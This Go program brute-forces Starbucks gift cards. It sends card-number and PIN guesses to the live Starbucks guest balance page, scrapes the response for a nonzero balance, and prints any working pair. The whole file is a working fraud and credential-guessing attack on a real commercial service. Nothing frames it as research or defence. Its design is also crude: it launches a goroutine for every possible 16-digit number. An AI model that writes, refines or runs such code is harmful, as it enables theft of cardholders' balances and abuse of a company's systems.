package main

import (
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"strconv"

	"github.com/yhat/scrape"
	"golang.org/x/net/html"
	"golang.org/x/net/html/atom"
)

const (
	homeURL string = "https://www.starbucks.com/card/guestbalance"
)
func GeneratePin(cardnumber int) {
	for i := 00000000; i <= 99999999;i++ {
		check := BalanceCheck(cardnumber, i)
		if check != false {
			fmt.Println("Found one!", cardnumber, i)
			break;
		}
	}
}
func BalanceCheck(cardnumber int, cardpin int) bool{
	// Add form data
	v := url.Values{}
	v.Set("Card.Number", strconv.Itoa(cardnumber))
	v.Set("Card.Pin", strconv.Itoa(cardpin))

	s := v.Encode()
	fmt.Printf("v.Encode(): %v\n", s)

	req, err := http.NewRequest("POST", homeURL, strings.NewReader(s))
	if err != nil {
		fmt.Printf("http.NewRequest() error: %v\n", err)
		return false
	}

	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")

	c := &http.Client{}
	resp, err := c.Do(req)
	if err != nil {
		fmt.Printf("http.Do() error: %v\n", err)
		return false
	}
	defer resp.Body.Close()
	root, err := html.Parse(resp.Body)
	if err != nil {
		fmt.Println(err)
	}
	matcher := func(n *html.Node) bool {
		if n.DataAtom == atom.Span && n.Parent != nil && n.Parent.Parent != nil {
			return scrape.Attr(n, "class") == "fetch_balance_value"
		}
		return false
	}
	articles := scrape.FindAll(root, matcher)
	for _, article := range articles {
		if scrape.Text(article) == "$0.00" {
			//Get rid of empty balances
			return false
		}
		fmt.Printf("%s\n", scrape.Text(article))
		return true
	}
	return false
}
func main() {
	for i := 0000000000000000; i <= 9999999999999999; i++ {
		go GeneratePin(i)
	}
	select{}
}